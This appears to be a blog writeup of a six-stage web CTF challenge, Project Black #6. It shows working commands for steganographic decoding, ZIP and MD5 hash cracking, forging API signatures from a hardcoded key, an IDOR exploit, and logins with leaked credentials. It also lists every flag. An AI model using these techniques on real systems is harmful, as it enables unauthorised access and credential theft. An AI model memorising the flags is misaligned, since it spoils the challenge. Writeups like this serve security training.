---
layout: post
title: Project Black Challenge 6 Writeup
description: Project Black is an online CTF series. Challenge 6 is a multi-stage web challenge involving steganography, API exploitation, IDOR, and database forensics.
author: drewbyte
date: 2026-05-12 00:00:00 +0800
categories: [writeup, ctf]
tags: [writeup, ctf]
pin: true
image:
  path: /assets/img/ghost.jpg
  alt: img
---

Project Black is an online CTF series hosted at [projectblack.io](https://projectblack.io). Challenge #6 is a multi-stage web challenge that requires the player to chain together several vulnerabilities — starting from a steganography-encoded text file, through API exploitation, all the way to database forensics — to capture all 6 flags.

**Disclaimer:** This writeup is intended solely for educational purposes. The target is a deliberately vulnerable CTF challenge hosted by Project Black. All testing was conducted against the intended target within the scope of the CTF. Do not attempt to replicate these techniques against any system without explicit written authorisation. Unauthorised access to computer systems is illegal and punishable by law.

## Table of Contents

1. [Stage 1 — MockingCase Steganography](#stage-1)
2. [Stage 2 — Unauthenticated API Enumeration](#stage-2)
3. [Stage 3 — Hardcoded Secret in JavaScript Bundle](#stage-3)
4. [Stage 4 — IDOR on /api/profile/](#stage-4)
5. [Stage 5 — Broken Access Control / Admin Dashboard](#stage-5)
6. [Stage 6 — Database Forensics & SUPER_ADMIN IDOR](#stage-6)

---

## Stage 1 — MockingCase Steganography {#stage-1}

The challenge starts at `https://projectblack.io/ctf/challenge6.txt`. Fetching the file returns a large block of text from the GNU Manifesto written in random mixed case (MockingCase).

```bash
┌──(kali㉿kali)-[~]
└─$ curl https://projectblack.io/ctf/challenge6.txt
tHe GnU mAnIfesTo
ThE GNu mANiFestO (whiCh appEarS beloW) waS wRittEn By richArD stalLMaN iN 1985 to aSk
For supPoRt iN deVeLoping ThE gnu opErATInG sYsTem...
```

The key observation is that the case of each letter encodes a binary bit — **uppercase = 1, lowercase = 0**. Grouping the bits into 8-bit chunks and converting to ASCII reveals a base64 string. Decoding that base64 string produces a ZIP file (confirmed by the `PK` magic bytes).

```bash
┌──(kali㉿kali)-[~]
└─$ python3 - << 'EOF'
import base64
with open('challenge6.txt', 'r') as f:
    text = f.read()
letters = [c for c in text if c.isalpha()]
bits = ['1' if c.isupper() else '0' for c in letters]
binary = ''.join(bits)
decoded_bytes = bytes(int(binary[i:i+8], 2) for i in range(0, len(binary)-7, 8))
printable = ''.join(chr(b) for b in decoded_bytes if 32 <= b < 127)
zip_bytes = base64.b64decode(printable + '==')
with open('flag.zip', 'wb') as f:
    f.write(zip_bytes)
print(f"Saved flag.zip ({len(zip_bytes)} bytes)")
print(f"Magic bytes: {zip_bytes[:4]}")
EOF
Saved flag.zip (318 bytes)
Magic bytes: b'PK\x03\x04'
```

The ZIP is password protected. The consultant cracked it using John the Ripper with the rockyou wordlist.

```bash
┌──(kali㉿kali)-[~]
└─$ zip2john flag.zip > hash.txt
ver 2.0 efh 5455 efh 7875 flag.zip/flag.txt PKZIP Encr: TS_chk, cmplen=136, decmplen=126

┌──(kali㉿kali)-[~]
└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
gandalf          (flag.zip/flag.txt)     
1g 0:00:00:00 DONE

┌──(kali㉿kali)-[~]
└─$ unzip flag.zip
[flag.zip] flag.txt password: gandalf
  inflating: flag.txt

┌──(kali㉿kali)-[~]
└─$ cat flag.txt
Congratulations! Here is your first flag:
PRJBLK{1/6:_U_@R3_0FF_2_A_f1YInG_$t@rT}
Continue here:
https://chortle.0hl.cc
```

![image](/assets/img/pic1.png){: .mx-auto .shadow .rounded-10 w="800" }

> **Flag 1/6:** `PRJBLK{1/6:_U_@R3_0FF_2_A_f1YInG_$t@rT}`

---

## Stage 2 — Unauthenticated API Enumeration {#stage-2}

The first flag points to `https://chortle.0hl.cc` — a React SPA login page for **Project Black Challenge #6**. Attempting to log in with a made-up username returns "Username does not exist", confirming the app validates usernames separately.

The consultant intercepted browser traffic using the developer tools Network tab. The app calls `GET /api/users/` on page load — with `Authorization: Bearer null`. The endpoint is completely unauthenticated.

```bash
┌──(kali㉿kali)-[~]
└─$ curl -s https://chortle.0hl.cc/api/users/ \
  -H "X-Signature: be35213f5990a7778a73ad1ca69e76ec" \
  -H "Authorization: Bearer null"
{"data": [
  {"id": "***", "username": "eddie", "description": "***", "privilege_level": "***", "md5": "***"},
  {"id": "8abc5219...", "username": "jarrod", "privilege_level": "USER", "md5": "f6f8539e588ab12618044af0d948cc2e"},
  {"id": "501745fb...", "username": "nikolai", "privilege_level": "USER", "md5": "482c811da5d5b4bc6d497ffa98491e38"},
  {"id": "e70f4e71...", "username": "jay", "privilege_level": "USER", "md5": "6c7c067eebbcbc795b19dae9643d95df"},
  {"id": "c023405b...", "username": "sayuri", "privilege_level": "USER", "md5": "95df532e1f3538622d2e01b41211e142"},
  {"id": "c150138a...", "username": "jason", "description": "Also known as Json", "privilege_level": "ADMIN", "md5": "2aa9b46343429ebc7aafcd9396a8224c"},
  {"id": "e1d90179...", "username": "mal", "description": "PRJBLK{2/6:_We_nE3d_0uR_@PP_t3sT3D._c@N_y0u_$T@rT_t0m0rR0W?}", "privilege_level": "USER", "md5": "0ad965199998016c5d5b6b500bf662ec"}
]}
```

Flag 2 is sitting in `mal`'s description field. The response also leaks every user's UUID, privilege level, and MD5 password hash — valuable for later stages.

![image](/assets/img/pic2.jfif){: .mx-auto .shadow .rounded-10 w="800" }

> **Flag 2/6:** `PRJBLK{2/6:_We_nE3d_0uR_@PP_t3sT3D._c@N_y0u_$T@rT_t0m0rR0W?}`

---

## Stage 3 — Hardcoded Secret in JavaScript Bundle {#stage-3}

The API requires an `X-Signature` header that changes per request. Reusing a captured signature returns `{"error": "Invalid signature", "detail": "Hash mismatch"}`. The consultant downloaded the React bundle and searched for how the signature is generated.

```bash
┌──(kali㉿kali)-[~]
└─$ curl -s https://chortle.0hl.cc/assets/index-Drc_o9hS.js > bundle.js

┌──(kali㉿kali)-[~]
└─$ grep -o '.\{0,200\}Signature.\{0,200\}' bundle.js
var Ov=`Th1$_1$_mY_$3Cr3t_3nCrYpt10N_k3Y`,kv=e=>{
  if(e===null)return Y_.default.MD5(Ov).toString();
  let t=JSON.stringify(e);
  return Y_.default.MD5(Ov+t).toString()
}
```

The signing key is hardcoded in the frontend JavaScript — `Th1$_1$_mY_$3Cr3t_3nCrYpt10N_k3Y`. The signature algorithm is:

- **GET requests:** `X-Signature = MD5(key + "")`
- **POST requests:** `X-Signature = MD5(key + JSON.stringify(body))`

With the key recovered, the consultant could now sign any API request. Cracking nikolai's MD5 hash with hashcat gave `password123`, allowing a valid login.

```bash
┌──(kali㉿kali)-[~]
└─$ hashcat -m 0 482c811da5d5b4bc6d497ffa98491e38 /usr/share/wordlists/rockyou.txt
482c811da5d5b4bc6d497ffa98491e38:password123
```

Calling `POST /api/alerts/` with a valid token returned flag 3.

```bash
┌──(kali㉿kali)-[~]
└─$ curl -s -X POST https://chortle.0hl.cc/api/alerts/ \
  -H "X-Signature: be35213f5990a7778a73ad1ca69e76ec" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Length: 0"
[{"id":"a53e8b0c-...","message":"PRJBLK{3/6:_Ye@H,_w3_@lr3ady_Kn3w_@b0ut_Th@t_cr1t1c@1_I$$u3}"}]
```

![image](/assets/img/pic3.jfif){: .mx-auto .shadow .rounded-10 w="800" }

> **Flag 3/6:** `PRJBLK{3/6:_Ye@H,_w3_@lr3ady_Kn3w_@b0ut_Th@t_cr1t1c@1_I$$u3}`

---

## Stage 4 — IDOR on /api/profile/ {#stage-4}

Logged in as nikolai (USER privilege), the consultant observed the dashboard making a `POST /api/profile/` request with the body `{"id":"<own_uuid>"}` to fetch the user's profile. The server does not validate that the UUID in the body matches the authenticated user's token — a classic **Insecure Direct Object Reference (IDOR)**.

The consultant replaced nikolai's UUID with jason's (`c150138a-fb84-491b-8880-3a852326fcd7`) and recomputed the signature.

```bash
┌──(kali㉿kali)-[~]
└─$ python3 -c "
import hashlib, json
KEY = 'Th1\$_1\$_mY_\$3Cr3t_3nCrYpt10N_k3Y'
body = json.dumps({'id':'c150138a-fb84-491b-8880-3a852326fcd7'}, separators=(',',':'))
print(hashlib.md5((KEY+body).encode()).hexdigest())
"
90c7c8f5972b542ad1c32543daef66b3

┌──(kali㉿kali)-[~]
└─$ curl -s -X POST https://chortle.0hl.cc/api/profile/ \
  -H "Content-Type: application/json" \
  -H "X-Signature: 90c7c8f5972b542ad1c32543daef66b3" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"id":"c150138a-fb84-491b-8880-3a852326fcd7"}'
{"flag":"PRJBLK{4/6:_DEV3l0pEr_t00l$!?_Y0u_must_be_@_Ma$t3r_h@ck3r}",
 "data":{"id":"c150138a-...","email":"jason@localhost","username":"jason",
         "privilege_level":"ADMIN","password":"kgf7ac69WDojJW5MNA2"}}
```

The response returns jason's full profile including his **plaintext password** and flag 4.

![image](/assets/img/pic4.jfif){: .mx-auto .shadow .rounded-10 w="800" }

> **Flag 4/6:** `PRJBLK{4/6:_DEV3l0pEr_t00l$!?_Y0u_must_be_@_Ma$t3r_h@ck3r}`

---

## Stage 5 — Broken Access Control / Admin Dashboard {#stage-5}

Using the plaintext password recovered from the IDOR, the consultant logged in as jason (ADMIN) at `chortle.0hl.cc/login`. The admin dashboard displays flag 5 directly as an alert on the page.

The dashboard also exposes three admin tools — **Database Backup**, **Locate File**, and **Read File**. Clicking Database Backup downloads `file.db`, the live Django SQLite database (132 KB).

![image](/assets/img/pic5.jfif){: .mx-auto .shadow .rounded-10 w="800" }

> **Flag 5/6:** `PRJBLK{5/6:_Br0k3n_Acc3$$_c0nTR01_KeEp$_M3_EMpL0y3D}`

---

## Stage 6 — Database Forensics & SUPER_ADMIN IDOR {#stage-6}

Opening `file.db` in DB Browser for SQLite reveals the Django database schema. Querying the `core_user` table shows that the application stores **cleartext passwords** alongside hashed ones in a dedicated column.

```bash
┌──(kali㉿kali)-[~]
└─$ sqlite3 ~/Downloads/file.db ".headers on" ".mode column" \
  "SELECT username, clear_text_password, privilege_level FROM core_user;"
username  clear_text_password  privilege_level
--------  -------------------  ---------------
eddie     bvhkVv8UnebiTSvRBYa  SUPER_ADMIN
jarrod    K9D9saKbWsnLnByacXs  USER
nikolai   password123          USER
jay       MdHffRZoiMPHFsTw4j5  USER
sayuri    QXwTm43pkDEtCdRfCiz  USER
jason     kgf7ac69WDojJW5MNA2  ADMIN
mal       ipYs5gLyFe4V2ctFbpE  USER
```

Eddie was **fully redacted** in all API responses but his credentials are exposed in the database. The consultant logged in as eddie (SUPER_ADMIN) and applied the same IDOR technique against `/api/profile/`, then called `/api/alerts/` with eddie's token.

```bash
┌──(kali㉿kali)-[~]
└─$ BODY='{"username":"eddie","password":"bvhkVv8UnebiTSvRBYa"}'
└─$ SIG=$(python3 -c "import hashlib; KEY='Th1\$_1\$_mY_\$3Cr3t_3nCrYpt10N_k3Y'; print(hashlib.md5((KEY+'$BODY').encode()).hexdigest())")
└─$ EDDIE_TOKEN=$(curl -s -X POST https://chortle.0hl.cc/api/token/ \
    -H "Content-Type: application/json" \
    -H "X-Signature: $SIG" \
    -d "$BODY" | python3 -c "import sys,json; print(json.load(sys.stdin)['access'])")

┌──(kali㉿kali)-[~]
└─$ curl -s -X POST https://chortle.0hl.cc/api/alerts/ \
  -H "X-Signature: be35213f5990a7778a73ad1ca69e76ec" \
  -H "Authorization: Bearer $EDDIE_TOKEN" \
  -H "Content-Length: 0"
[{"id":"211fe1cb-...","message":"PRJBLK{6/6:_w0W,_d@tAb@s3_M1Gr@Ti0n$_R_s0_E@$y!!1!}"}]
```

![image](/assets/img/pic6.jfif){: .mx-auto .shadow .rounded-10 w="800" }

> **Flag 6/6:** `PRJBLK{6/6:_w0W,_d@tAb@s3_M1Gr@Ti0n$_R_s0_E@$y!!1!}`

---

## All Flags

| Flag | Value |
|------|-------|
| 1/6 | `PRJBLK{1/6:_U_@R3_0FF_2_A_f1YInG_$t@rT}` |
| 2/6 | `PRJBLK{2/6:_We_nE3d_0uR_@PP_t3sT3D._c@N_y0u_$T@rT_t0m0rR0W?}` |
| 3/6 | `PRJBLK{3/6:_Ye@H,_w3_@lr3ady_Kn3w_@b0ut_Th@t_cr1t1c@1_I$$u3}` |
| 4/6 | `PRJBLK{4/6:_DEV3l0pEr_t00l$!?_Y0u_must_be_@_Ma$t3r_h@ck3r}` |
| 5/6 | `PRJBLK{5/6:_Br0k3n_Acc3$$_c0nTR01_KeEp$_M3_EMpL0y3D}` |
| 6/6 | `PRJBLK{6/6:_w0W,_d@tAb@s3_M1Gr@Ti0n$_R_s0_E@$y!!1!}` |
